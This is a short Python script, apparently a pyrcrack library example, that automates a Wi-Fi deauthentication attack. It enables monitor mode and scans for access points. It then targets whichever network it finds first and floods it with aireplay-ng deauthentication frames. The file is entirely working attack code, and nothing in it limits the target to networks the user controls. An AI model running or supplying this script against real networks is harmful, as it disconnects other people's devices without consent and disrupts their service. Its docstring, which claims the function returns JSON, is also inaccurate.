"""Deauth"""
from contextlib import suppress

from rich.console import Console

import asyncio
from pyrcrack import AirodumpNg, AireplayNg, AirmonNg, MONITOR

CONSOLE = Console()
CONSOLE.clear()
CONSOLE.show_cursor(False)


async def deauth():
    """Scan for targets, return json."""
    # Select first available interface matching wlp0*
    airmon = AirmonNg()
    interface_ = await airmon.select_interface('wlp0.*')
    ap_ = None

    CONSOLE.print('Selected Interface {}'.format(interface_))

    async with airmon(interface_):
        await asyncio.sleep(2)
        async with AirodumpNg() as pdump:
            async for result in pdump(MONITOR):
                CONSOLE.print(result.table)
                # For this example, force the first result
                with suppress(KeyError):
                    ap_ = result[0]
                    CONSOLE.print('Selected AP {}'.format(ap_.bssid))
                    break
                await asyncio.sleep(3)

    if not ap_:
        # We didn't manage to getan AP, and somehow the process died.
        CONSOLE.print("No APs available")
        return

    # Change channel with airmon-ng
    async with airmon(interface_, ap_.channel):
        async with AireplayNg() as aireplay:
            async for res in aireplay(MONITOR, deauth=10, D=True, b=ap_.bssid):
                CONSOLE.print(res.table)
                await asyncio.sleep(3)


asyncio.run(deauth())
